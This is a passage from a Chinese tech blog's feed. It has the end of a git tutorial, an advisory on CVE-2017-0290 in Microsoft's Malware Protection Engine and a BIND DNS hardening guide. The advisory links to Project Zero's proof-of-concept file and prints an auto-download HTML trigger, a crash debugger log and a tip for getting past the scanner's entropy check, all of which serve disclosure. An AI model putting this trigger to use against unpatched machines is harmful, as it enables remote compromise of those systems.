master</span><br></pre></td></tr></table></figure></li></ul><p>至此本案例介绍完成，如果大家遵从这样的一个工作流程，相信大家都能成为一个高效的团队。</p><p>至此本文介绍完毕,如有问题及不足欢迎与我联络。</p><h3 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h3><p><a href="http://baike.baidu.com/item/GIT/12647237" target="_blank" rel="noopener">http://baike.baidu.com/item/GIT/12647237</a></p><p><a href="https://services.github.com/on-demand/downloads/github-git-cheat-sheet.pdf" target="_blank" rel="noopener">https://services.github.com/on-demand/downloads/github-git-cheat-sheet.pdf</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、文章说明&quot;&gt;&lt;a href=&quot;#一、文章说明&quot; class=&quot;headerlink&quot; title=&quot;一、文章说明&quot;&gt;&lt;/a&gt;一、文章说明&lt;/h2&gt;&lt;p&gt;本文详细介绍git的基础操作及命令详解，并通过两个经典案例进行实践练习。&lt;/p&gt;
&lt;h2 id=&quot;二、Git
      
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="git" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/git/"/>
    
    
      <category term="git" scheme="http://blog.unixmen.cn/tags/git/"/>
    
      <category term="git command" scheme="http://blog.unixmen.cn/tags/git-command/"/>
    
      <category term="git 命令行" scheme="http://blog.unixmen.cn/tags/git-%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>Windows系统恶意软件防护引擎曝严重远程代码执行漏洞（CVE-2017-0290）</title>
    <link href="http://blog.unixmen.cn/2017/05/10/Windows%E7%B3%BB%E7%BB%9F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E9%98%B2%E6%8A%A4%E5%BC%95%E6%93%8E%E6%9B%9D%E4%B8%A5%E9%87%8D%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-0290%EF%BC%89/"/>
    <id>http://blog.unixmen.cn/2017/05/10/Windows系统恶意软件防护引擎曝严重远程代码执行漏洞（CVE-2017-0290）/</id>
    <published>2017-05-10T05:12:14.000Z</published>
    <updated>2017-05-10T05:14:22.400Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文章简述"><a href="#文章简述" class="headerlink" title="文章简述"></a>文章简述</h2><p>微软昨天发布了一个安全公告——微软自家的恶意程序防护引擎出现高危安全漏洞。影响到包括MSE、Windows Defender防火墙等在内的产品，危害性还是相当严重的。微软当前已经提供了升级以修复漏洞，并表示没有证据表明攻击者已经利用该漏洞。</p><h2 id="漏洞编号："><a href="#漏洞编号：" class="headerlink" title="漏洞编号："></a>漏洞编号：</h2><p>CVE-2017-0290</p><h2 id="漏洞危害程度："><a href="#漏洞危害程度：" class="headerlink" title="漏洞危害程度："></a>漏洞危害程度：</h2><p>Critical，严重</p><h2 id="漏洞概述："><a href="#漏洞概述：" class="headerlink" title="漏洞概述："></a>漏洞概述：</h2><p>简单说来，当微软恶意程序防护引擎（Microsoft Malware Protection Engine）检测某个恶意构造的文件后，攻击者就能利用漏洞实现远程代码执行。成功利用该漏洞，攻击者就能在LocalSystem帐号安全上下文执行任意代码，并控制系统。</p><p>攻击者随后就能安装程序；查看、更改或删除数据；或者以完整的用户权限来构建新账户。</p><p>攻击者实际上有很多种方法让微软的恶意程序保护引擎扫描到恶意构建的文件，比如目标用户浏览某个网站的时候就能分发恶意部署文件，或者通过邮件信息、即时通讯消息——在实时扫描开启的情况下，甚至不需要用户打开这些文件，微软恶意程序防护引擎就会对其进行扫描。</p><h2 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h2><p>很多微软的反恶意程序产品都在使用微软恶意程序防护引擎。鉴于其中包含Windows 7/8/8.1/10/Server 2016中就默认安装的反恶意程序产品，该漏洞应该是非常严重。微软在其安全公告页面中列出了受影响产品，包括：</p><blockquote><p>Microsoft Forefront Endpoint Protection 2010<br>Microsoft Endpoint Protection<br>Microsoft Forefront Security for SharePoint Service Pack 3<br>Microsoft System Center Endpoint Protection<br>Microsoft Security Essentials<br>Windows Defender for Windows 7<br>Windows Defender for Windows 8.1<br>Windows Defender for Windows RT 8.1<br>Windows Defender for Windows 10, Windows 10 1511, Windows 10 1607, Windows Server 2016, Windows 10 1703<br>Windows Intune Endpoint Protection</p></blockquote><h2 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h2><p>具体来说，MsMpEng是恶意程序防护服务，Windows 8/8.1/10/Server 2012等都默认启用。MSE（Microsoft Security Essentials）、系统中心终端防护和微软的各种安全产品都采用此核心引擎。</p><p>MsMpEng以AUTHORITY\SYSTEM权限运行，无沙盒，通过Windows服务（如Exchange、IIS等）在无需身份认证的情况下可远程访问。</p><p>在工作站之上，攻击者给用户发送邮件（甚至不需要阅读邮件或打开附件）、在浏览器中访问链接、使用即时通讯等，就能访问mpengine（MsMpEng用于扫描和分析的核心组件）。因为MsMpEng采用文件系统minifilter来拦截以及检查所有的文件系统活动，所以给硬盘的任意位置写入相应内容就能实现mpengine中函数的访问。</p><p>鉴于其高权限、可访问及普遍存在性，MsMpEng中的这个漏洞还是极为严重的。</p><p>不难发现mpengine本身就是个很大的攻击面，其中包含很多专门的文件格式、可执行封装包、cryptor、完整系统模拟器的Handler，还有各种架构和语言的解释器。所有这些代码，远程攻击者都是可以访问的。</p><p>其中NScript是mpengine的一个组件，这个组件用于评估任意看起来像是JS的文件系统或网络活动。值得一提的是，这是个无沙盒环境、高权限的JavaScript interpreter——用于评估不受信任的代码。</p><p>谷歌的研究人员写了个工具，通过代码shell访问NScript。发现函数JsDelegateObject_Error::toString()会从中读取“message”属性，但在传递给JsRuntimeState::triggerShortStrEvent()之前未能验证属性类型。其默认假定message是个字符串，但实际上可以是任意类型。这就能够让攻击者传递其它任意对象。</p><p>更多详情可参见<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1252&amp;desc=5" target="_blank" rel="noopener">Chromium</a>。其中也提供了漏洞再现的方法。</p><p>若要再现该漏洞，可点击这里下载：<a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=283405" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/attachment?aid=283405</a> 。访问包含下述代码的网站后，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;testcase.txt&quot; download id=link&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;link&quot;).click();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>捕捉到的debug会话：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">3: kd&gt; !process</span><br><span class="line">PROCESS 8805fd28  SessionId: 0  Cid: 0afc    Peb: 7ffdf000  ParentCid: 01c8</span><br><span class="line">    DirBase: bded14e0  ObjectTable: bfb99640  HandleCount: 433.</span><br><span class="line">    Image: MsMpEng.exe</span><br><span class="line">3: kd&gt; !token -n</span><br><span class="line">_EPROCESS 8805fd28, _TOKEN 00000000</span><br><span class="line">TS Session ID: 0</span><br><span class="line">User: S-1-5-18 (Well Known Group: NT AUTHORITY\SYSTEM)</span><br><span class="line">3: kd&gt; .lastevent</span><br><span class="line">Last event: Access violation - code c0000005 (first chance)</span><br><span class="line">  debugger time: Fri May  5 18:22:14.740 2017 (UTC - 7:00)</span><br><span class="line">3: kd&gt; r</span><br><span class="line">eax=00000010 ebx=1156c968 ecx=41414141 edx=115730f8 esi=68bd9100 edi=41414141</span><br><span class="line">eip=68b1f5f2 esp=0208e12c ebp=0208e134 iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010293</span><br><span class="line">mpengine!FreeSigFiles+0xec822:</span><br><span class="line">001b:68b1f5f2 8b07            mov     eax,dword ptr [edi] ds:0023:41414141=????????</span><br><span class="line">3: kd&gt; lmv mmpengine</span><br><span class="line">start    end        module name</span><br><span class="line">68790000 6917a000   mpengine   (export symbols)       mpengine.dll</span><br><span class="line">    Loaded symbol image file: mpengine.dll</span><br><span class="line">    Image path: c:\ProgramData\Microsoft\Microsoft Antimalware\Definition Updates\&#123;1C2B7358-645B-41D0-9E79-5FA3E5C4EB51&#125;\mpengine.dll</span><br><span class="line">    Image name: mpengine.dll</span><br><span class="line">    Timestamp:        Thu Apr 06 16:05:37 2017 (58E6C9C1)</span><br><span class="line">    CheckSum:         00A1330D</span><br><span class="line">    ImageSize:        009EA000</span><br><span class="line">    Translations:     0000.04b0 0000.04e4 0409.04b0 0409.04e4</span><br><span class="line">3: kd&gt; u</span><br><span class="line">mpengine!FreeSigFiles+0xec822:</span><br><span class="line">001b:68b1f5f2 8b07            mov     eax,dword ptr [edi]</span><br><span class="line">001b:68b1f5f4 56              push    esi</span><br><span class="line">001b:68b1f5f5 8b7008          mov     esi,dword ptr [eax+8]</span><br><span class="line">001b:68b1f5f8 8bce            mov     ecx,esi</span><br><span class="line">001b:68b1f5fa ff15c0450e69    call    dword ptr [mpengine!MpContainerWrite+0x35f3a0 (690e45c0)]</span><br><span class="line">001b:68b1f600 8bcf            mov     ecx,edi</span><br><span class="line">001b:68b1f602 ffd6            call    esi           &lt;--- Jump to attacker controlled address</span><br><span class="line">001b:68b1f604 5e              pop     esi</span><br></pre></td></tr></table></figure></p><p>值得一提的是，在执行JS之前，mpengine采用各种启发式方案来决定是否有必要作评估。其中一个启发式方案会评估文件熵——不过研究人员发现其实只要附加上足够多的注释，也就能够触发所谓的“评估”过程了。</p><h2 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h2><p>微软在安全公告中提到，终端用户和企业管理员不需要进行额外的操作，微软恶意程序引擎本身自动检测和更新部署机制会在48小时内应用更新。具体更新时间，视所用软件、互联网连接和基建配置而定。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;文章简述&quot;&gt;&lt;a href=&quot;#文章简述&quot; class=&quot;headerlink&quot; title=&quot;文章简述&quot;&gt;&lt;/a&gt;文章简述&lt;/h2&gt;&lt;p&gt;微软昨天发布了一个安全公告——微软自家的恶意程序防护引擎出现高危安全漏洞。影响到包括MSE、Windows Defender
      
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="漏洞" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Intel AMT 漏洞" scheme="http://blog.unixmen.cn/tags/Intel-AMT-%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>全面提升BIND DNS服务器安全</title>
    <link href="http://blog.unixmen.cn/2017/05/09/%E5%85%A8%E9%9D%A2%E6%8F%90%E5%8D%87BIND-DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    <id>http://blog.unixmen.cn/2017/05/09/全面提升BIND-DNS服务器安全/</id>
    <published>2017-05-09T10:37:54.000Z</published>
    <updated>2017-05-10T09:51:38.056Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文章简介"><a href="#文章简介" class="headerlink" title="文章简介"></a>文章简介</h2><p>本文介绍了当前互联网DNS服务器所存在的隐患（几种典型的DNS攻击方式）及安全加固</p><h2 id="DNS服务所面临的安全隐患"><a href="#DNS服务所面临的安全隐患" class="headerlink" title="DNS服务所面临的安全隐患"></a>DNS服务所面临的安全隐患</h2><p>互联网上DNS服务器的事实标准就是ISC的BIND，BillManning对in-addr域的调查发现，有95%的域名服务器(2的2000次方个服务器中)使用的是各种版本的“bind”。这其中包括了所有的DNS根服务器，而这些根服务器对整个服务器的正常运转起着至关重要的作用。<br> DNS服务所面临的安全隐患包括：</p><ul><li>DNS欺骗（DNSSpoffing）</li><li>拒绝服务（Denialofservice，DoS）攻击</li><li>分布式拒绝服务攻击（Distributed Denial of Service，DDoS）</li><li>缓冲区漏洞溢出攻击（BufferOverflow）</li></ul><h3 id="1-DNS欺骗"><a href="#1-DNS欺骗" class="headerlink" title="1.DNS欺骗"></a>1.DNS欺骗</h3><p>DNS欺骗即域名信息欺骗是最常见的DNS安全问题。<br>当一个DNS服务器掉入陷阱，使用了来自一个恶意DNS服务器的错误信息，那么该DNS服务器就被欺骗了。DNS欺骗会使那些易受攻击的DNS服务器产生许多安全问题，<br>例如：将用户引导到错误的互联网站点，或者发送一个电子邮件到一个未经授权的邮件服务器。网络攻击者通常通过两种方法进行DNS欺骗。</p><ul><li><p>（1）缓存感染<br>黑客会熟练的使用DNS请求，将数据放入一个没有设防的DNS服务器的缓存当中。这些缓存信息会在客户进行DNS访问时返回给客户，从而将客户引导到入侵者所设置的运行木马的Web服务器或邮件服务器上，然后黑客从这些服务器上获取用户信息。</p></li><li><p>（2）DNS信息劫持<br>入侵者通过监听客户端和DNS服务器的对话，通过猜测服务器响应给客户端的DNS查询ID。每个DNS报文包括一个相关联的16位ID号，DNS服务器根据这个ID号获取请求源位置。黑客在DNS服务器之前将虚假的响应交给用户，从而欺骗客户端去访问恶意的网站。</p></li><li><p>（3）DNS重定向<br>攻击者能够将DNS名称查询重定向到恶意DNS服务器。这样攻击者可以获得DNS服务器的写权限。</p></li></ul><h3 id="2-拒绝服务攻击"><a href="#2-拒绝服务攻击" class="headerlink" title="2.拒绝服务攻击"></a>2.拒绝服务攻击</h3><p>黑客主要利用一些DNS软件的漏洞，如在BIND9版本（版本9.2.0以前的9系列）如果有人向运行BIND的设备发送特定的DNS数据包请求，BIND就会自动关闭。攻击者只能使BIND关闭，而无法在服务器上执行任意命令。如果得不到DNS服务，那么就会产生一场灾难：由于网址不能解析为IP地址，用户将无方访问互联网。这样，DNS产生的问题就好像是互联网本身所产生的问题，这将导致大量的混乱。</p><h3 id="3-分布式拒绝服务攻击"><a href="#3-分布式拒绝服务攻击" class="headerlink" title="3.分布式拒绝服务攻击"></a>3.分布式拒绝服务攻击</h3><p>DDOS攻击通过使用攻击者控制的几十台或几百台计算机攻击一台主机，使得服务拒绝攻击更难以防范：使服务拒绝攻击更难以通过阻塞单一攻击源主机的数据流，来防范服务拒绝攻击。SynFlood是针对DNS服务器最常见的分布式拒绝服务攻击。SYNFlood攻击利用的是IPv4中TCP协议的三次握手（Three-WayHandshake）过程进行的攻击。大家知道协议规定，如果一端想向另一端发起TCP连接，它需要首先发送TCPSYN包到对方，对方收到后发送一个TCPSYN+ACK包回来，发起方再发送TCPACK包回去，这样三次握手就结束了。我们把TCP连接的发起方叫作”TCP客户机（TCPClient）”，TCP连接的接收方叫作”TCP服务器（TCPServer）”。</p><p>值得注意的是在TCP服务器收到TCPSYNrequest包时，在发送TCPSYN+ACK包回TCP客户机前，TCP服务器要先分配好一个数据区专门服务于这个即将形成的TCP连接。一般把收到SYN包而还未收到ACK包时的连接状态成为半开连接（Half-openConnection）。在最常见的SYNFlood攻击中，攻击者在短时间内发送大量的TCPSYN包给受害者，这时攻击者是TCP客户机，受害者是TCP服务器。根据上面的描述，受害者会为每个TCPSYN包分配一个特定的数据区，只要这些SYN包具有不同的源地址（这一点对于攻击者来说是很容易伪造的）。这将给TCP服务器系统造成很大的系统负担，最终导致系统不能正常工作。</p><h3 id="4-缓冲区漏洞溢出攻击"><a href="#4-缓冲区漏洞溢出攻击" class="headerlink" title="4.缓冲区漏洞溢出攻击"></a>4.缓冲区漏洞溢出攻击</h3><p>黑客利用DNS服务器软件存在漏洞，比如对特定的输入没有进行严格检查，那幺有可能被攻击者利用，攻击者构造特殊的畸形数据包来对DNS服务器进行缓冲区溢出攻击。如果这一攻击成功，就会造成DNS服务停止，或者攻击者能够在DNS服务器上执行其设定的任意代码。例如,前一阵子针对Linux平台的BIND的攻击(e.g.Lionworm)程序,就是利用某些版本的BIND漏洞,取得root权限,一旦入侵完成之后,入侵者就可以完全控制整个相关的网络系统,影响非常严重。主要包括：</p><ul><li><p>（1）更改MX记录，造成邮件被截获、修改或删除。</p></li><li><p>（2）更改A记录，使您的WWW服务器的域名指向黑客的具有同样WWW内容的主机，诱使访问者登录，获取访问者的密码等相关信息。添加A记录，使黑客的主机拥有被相信的域名，以此来入侵通过启用域名信任机制的系统。</p></li><li><p>（3）利用这台主机作为攻击其他机器的“跳板”。</p></li></ul><h2 id="应对以上这些安全隐患方法有两个最有效的原则："><a href="#应对以上这些安全隐患方法有两个最有效的原则：" class="headerlink" title="应对以上这些安全隐患方法有两个最有效的原则："></a>应对以上这些安全隐患方法有两个最有效的原则：</h2><h3 id="1-选择安全没有缺陷的DNS版本："><a href="#1-选择安全没有缺陷的DNS版本：" class="headerlink" title="1.选择安全没有缺陷的DNS版本："></a>1.选择安全没有缺陷的DNS版本：</h3><p>BIND主要分为三个版本：</p><ul><li><p>（1）v4，1998年多数UNIX捆绑的是BIND4，已经被多数厂商抛弃了，除了OpenBSD还在使用。OpenBSD核心人为BIND8过于复杂和不安全，所以继续使用BIND4。这样一来BIND8/9的很多优点都不包括在v4中。</p></li><li><p>（2）v8，就是如今使用最多最广的版本，其详细内容可以参阅“BIND8+域名服务器安全增强”<a href="http://security.nsfocus.com/showQueryL.asplibID=530" target="_blank" rel="noopener">http://security.nsfocus.com/showQueryL.asplibID=530</a></p></li><li><p>（3）v9，最新版本的BIND，全部重新写过，免费（但是由商业公司资助），BIND9在2000年十月份推出，根据调查v9版本的BIND是最安全的，它的最新安全版本在其官方网站：<a href="http://www.isc.org/下载下载源代码安装即可。例如使用Linux系统针对拒绝服务攻击只要将BIND9升级为版本9.2.1即可。" target="_blank" rel="noopener">http://www.isc.org/下载下载源代码安装即可。例如使用Linux系统针对拒绝服务攻击只要将BIND9升级为版本9.2.1即可。</a></p></li></ul><h3 id="2-保持DNS服务器配置正确、可靠"><a href="#2-保持DNS服务器配置正确、可靠" class="headerlink" title="2.保持DNS服务器配置正确、可靠"></a>2.保持DNS服务器配置正确、可靠</h3><p>这一点相对困难。Linux上的域名服务由named守护进程控制，该进程从主文件：/etc/named.conf中获取信息。它包括一组将主机名称映射为IP地址的各种文件。<br>Linux下主要DNS配置文件见表一、二、三：<br>表－1DNS主要配置文件点击看大图<br>表－2named配置文件族点击看大图named.conf时DNS中的核心它的配置见表三：<br>表－3named.conf文件的配置点击看大图<br>可以看到DNS配置文件是一个复杂的系统。伴随DNS建立出现的许多问题都会引起相同的结果，但起因却不同。但大多数问题是由于配置文件中的语法错误而导致的。DNS是一组文件构成的，所以需要不同工具检查对应文件。一个配置存在缺陷的DNS服务器会存在很大的安全漏洞。这里可以通过一些工具：nslookup、dig、named-checkzone、host、named-checkconf、dlint等对DNS配置文件进行检查。其中安装BIND软件包时自动安装的工具包括：nslookup、dig、named-checkzone、host、named-checkconf。dlint是一个专门检查DNS配置文件开放源代码软件。可以在<br><a href="http://www.domtools.com/dns/dlint.shtml下载。" target="_blank" rel="noopener">http://www.domtools.com/dns/dlint.shtml下载。</a><br>在维护DNS服务器时，网管员希望知道到底是哪些用户在使用DNS服务器，同时也希望能对DNS状态查询做一个统计。这里我们可以使用dnstop查询DNS服务器状态：<br>软件下载和安装：<br>运行软件：<br>如果想查看通过eth0的DNS网络流量可以使用命令</p><p>在运行dnstop的过程中，可以敲入如下命令：s，d，t，1，2，3,ctrl+r，ctrl+x，以交互方式来显示不同的信息。<br>1－（TLD）记录查询的顶级域名，<br>2－（SLD）记录查询的二级域名，<br>3－（SLD）记录查询的三级域名，<br>s－（Source）记录发送dns查询的客户端ip地址表，<br>d－（Destinations）记录dns查询的目的服务器的ip地址表，<br>t－（QueryType）记录查询详细类型。<br>ctrl+r－重新纪录。<br>ctrl+x－退出。更详细信息可以查看mandnstop。</p><h2 id="安全加固"><a href="#安全加固" class="headerlink" title="安全加固"></a>安全加固</h2><p>下面以使用最为广泛的Unix类DNS软件BIND为例，介绍如何配置一个安全DNS服务器。本文以RHEL4.0为工作平台。</p><h3 id="1-隔离DNS服务器"><a href="#1-隔离DNS服务器" class="headerlink" title="1.隔离DNS服务器"></a>1.隔离DNS服务器</h3><p>首先应该隔离BIND服务器，不应该在DNS服务器上跑其他服务，尽量允许普通用户登陆。减少其它的服务可以缩小被攻击的可能性，比如混合攻击。</p><h3 id="2-隐藏BIND的版本号"><a href="#2-隐藏BIND的版本号" class="headerlink" title="2.隐藏BIND的版本号"></a>2.隐藏BIND的版本号</h3><p>通常软件的BUG信息是和特定版本相关的，因此版本号是黑客寻求最有价值的信息。黑客使用dig命令可以查询BIND的版本号，然后黑客就知道这个软件有那些漏洞。因此随意公开版本号是不明智的。隐藏BIND版本号比较简单，修改配置文件：/etc/named.conf，在option部分添加version声明将BIND的版本号信息覆盖。例如使用下面的配置声明，当有人请求版本信息时，迫使nmaed显示：“Unsupportedonthisplatform”</p><h3 id="3-避免透露服务器信息"><a href="#3-避免透露服务器信息" class="headerlink" title="3.避免透露服务器信息"></a>3.避免透露服务器信息</h3><p>和版本号一样，也不要轻易透露服务器其他信息。为了让潜在的黑客更难得手，建议不要在DNS配置文件中使用这HINFO和TXT两个资源记录。</p><h3 id="4-关闭DNS服务器的gluefetching选项"><a href="#4-关闭DNS服务器的gluefetching选项" class="headerlink" title="4.关闭DNS服务器的gluefetching选项"></a>4.关闭DNS服务器的gluefetching选项</h3><p>当DNS服务器返回一个域的域名服务器纪录并且域名服务器纪录中没有A纪录，DNS服务器会尝试获取一个纪录。就称为gluefetching,攻击者可以利用它进行DNS欺骗。关闭gluefetching是一个好方法，修改配置文件：/etc/named.conf.加入一行：</p><h3 id="5-使用非root权限运行BIND"><a href="#5-使用非root权限运行BIND" class="headerlink" title="5.使用非root权限运行BIND"></a>5.使用非root权限运行BIND</h3><p>在Linux内核2.3.99以后的版本中，可以以－u选项以非root权限运行BIND。命令如下：</p><p>上面的命令表示以nobody用户身份运行BIND。使用nobody身份运行能够降低缓冲区溢出攻击所带来的危险。</p><h3 id="6-控制区域-zone-传输"><a href="#6-控制区域-zone-传输" class="headerlink" title="6.控制区域(zone)传输"></a>6.控制区域(zone)传输</h3><p>默认情况下BIND的区域(zone)传输是全部开放的，如果没有限制那么DNS服务器允许对任何人都进行区域传输的话，那么网络架构中的主机名、主机IP列表、路由器名和路由IP列表，甚至包括各主机所在的位置和硬件配置等情况都很容易被入侵者得到。因此，要对区域传输进行必要的限制。可以通过在／etc／named．conf文件当中添加以下语句来限制区域传输：<br>这样只有IP地址为：从192.168.0.52到192.168.0.109的主机能够同DNS服务器进行区域传输。</p><h3 id="7-请求限制"><a href="#7-请求限制" class="headerlink" title="7.请求限制"></a>7.请求限制</h3><p>如果任何人都可以对DNS服务器发出请求，那么这是不能接受的。限制DNS服务器的服务范围很重要，可以把许多入侵者据之门外。修改BIND的配置文件：/etc/named.conf加入以下内容：</p><p>这样所有的用户都可以访问yourdomain.com的DNS服务器，但是只有168.192.1.0网段的主机用户可以请求DNS服务器的任意服务。<br>另外也不要允许其他网段的主机进行递归询问，在上面文件最后加入一行即可：</p><h3 id="8-其他強化措施："><a href="#8-其他強化措施：" class="headerlink" title="8.其他強化措施："></a>8.其他強化措施：</h3><p>（1）使用存取控制清单(AccessControlLists)，主要目的在于产生地址配对清单。<br>语法：acl“name”{address_match_list};<br>　address_match_list：地址匹对清单。<br>例子：acl“mis”{192.168.200.15,192.168.143.192/26};</p><p>（2）使用Forwarders代询服务器机制，它将自己无法解析的查询转送到某特定的服务器。<br>语法：forwardersip_address_liest<br>例子：以下是建议的forwarders设定(在/etc/named.conf中)<br>　orwarders{//指定提供查询的上层DNS。<br>　<a href="http://www.twnic.net.tw;//到上层(twnic)的DNS查询。" target="_blank" rel="noopener">www.twnic.net.tw;//到上层(twnic)的DNS查询。</a><br>　};<br>需注意的是通常我们指定的是到本身上一层dns，但也可能因dns缓存有误而转送到错误的服务器上。</p><p>（3）使用allow-transfer：目的在于只允许授权的网域主机能更新、读取DNS辖区内的记录。<br>语法：allow-transfer{&lt;address_match_list&gt;};<br>例子：address_match_list：允许进行DNS辖区数据传输主机的IP列表。</p><p>（4）allow-update：目的在于指定能向本dns服务器提交动态dns更新的主机<br>语法：allow-update{&lt;address_match_list&gt;};<br>例子：address_match_list：允许能向本DNS服务器提交动态DNS更新的主机IP列表</p><h3 id="9-使用DNSSEC"><a href="#9-使用DNSSEC" class="headerlink" title="9.使用DNSSEC"></a>9.使用DNSSEC</h3><p>DNS欺骗spoofing对目前网络应用,最大的冲击在于冒名者借着提供假的网域名称与网址的对照信息,可以将不知情用户的网页联机,导引到错误的网站,原本属于用户的电子邮件也可能因而遗失,甚而进一步空开成为阻断服务的攻击。所幸,目前较新的BIND版本,针对这一类问题,已经有加入许多改进的方法,不过真正的解决方案,则有赖封包认证机制的建立与推动。DNSSEC就是试图解决这一类问题的全新机制,BIND9已经完整加以设计并完成。DNSSEC引入两个全新的资源记录类型：KEY和SIG，允许客户端和域名服务器对任何DNS数据的来源进行密码验证。<br>DNSSEC主要依靠公钥技术对于包含在DNS中的信息创建密码签名。密码签名通过计算出一个密码hash数来提供DNS中数据的完整性，并将该hash数封装进行保护。私/公钥对中的私钥用来封装hash数，然后可以用公钥把hash数译出来。如果这个译出的hash值匹配接收者刚刚计算出来的hash树，那么表明数据是完整的。不管译出来的hash数和计算出来的hash数是否匹配，对于密码签名这种认证方式都是绝对正确的，因为公钥仅仅用于解密合法的hash数，所以只有拥有私钥的拥有者可以加密这些信息。</p><h3 id="10-为DNS服务器配置DNSFloodDetector"><a href="#10-为DNS服务器配置DNSFloodDetector" class="headerlink" title="10.为DNS服务器配置DNSFloodDetector"></a>10.为DNS服务器配置DNSFloodDetector</h3><p>DNSFloodDetector是针对DNS服务器的SynFlood攻击检测工具，用于侦测恶意的使用DNS查询功能。它利用libpcap的网络数据包捕获函数功能检测网络流量来判断是否受到SynFlood攻击，DNSFloodDetctor运行方式分成：守护进程（daemon）模式和后台（bindsnap）模式。以守护进程模式运行时它会通过syslog发出警示(/var/log/messages)，以后台模式运行时可以得到实时的查询状态。<br>下载安装：</p><p>命令格式:<br>dns_flood_detector[选项]<br>主要选项：<br>-iIFNAME监听某一特定接口。<br>-tN当每秒查询数量超过N值时发出警示.<br>-aN经过N秒后重置警示。<br>-wN每隔N秒显示状态。<br>-xN创建N个buckets。<br>-mN每隔N秒显示所有状态。<br>-b以后台模式执行(bindsnap)。<br>-d以守护进程模式执行(daemon)。<br>-v显示较多的输出信息。<br>-h显示使用方式。</p><p>应用实例:<br>dns_flood_detector-b-v-v–t3见下图。<br>dns_flood_detector工作界面</p><p>messages的纪录：以守护进程模式执行,纪录每秒超过3次查询的纪录,显示最多信息,包含APTRMX纪录等。</p><h3 id="11-建立完整的域名服务器"><a href="#11-建立完整的域名服务器" class="headerlink" title="11.建立完整的域名服务器"></a>11.建立完整的域名服务器</h3><p>Linux下的DNS服务器用来存储主机的域名信息。包括三种：<br>（1）惟高速存域名服务器（Cache-onlyserver）<br>惟高速存域名服务器（Cache-onlyserver）不包含域名数据库。它从某个远程服务器取得每次域名服务器查询的回答，一旦取得一个回答，就将它放入高速缓存中。<br>（2）主域名服务器（PrimaryNameserver）<br>主域名服务器是特定域所有信息的权威来源。它从域管理员构造的本地文件中加载域信息，该“区文件”包含着服务器具有管理权的部分域结构的最精确的信息。主域名服务器需要配置包括一组完整的文件：主配置文件（named.conf）、正向域的区文件(named.hosts)、反向域的区文件(named.rev)、高速缓存初始化文件(named.ca)和回送文件(named.local)。<br>（3）辅助域名服务器（SecondNameServer）<br>辅助域名服务器用来从主服务器中转移一整套域信息。辅助域名服务器是可选的配置选项。区文件是从主服务器转移出的，作为磁盘文件保存在辅助域名服务器中。辅助域名服务器不需配置本地区文件。<br>说明：多数域名服务器要根据网络实际情况将以上三种服务器组合，进行合理配置。所有的域名服务器都需要一个设置惟高速缓存服务器提供名字解析。一个域只能建立一个主域名服务器，另外至少要创建一个辅助域名服务器作为主域名服务器的备份。一个域的主服务器可以是其他域的辅助域名服务器。为了提高域名系统的可靠性，应建立辅域名服务器。当主域名服务器不能正常工作的情况下，能够替代主域名服务器对外提供不间断的服务。</p><h3 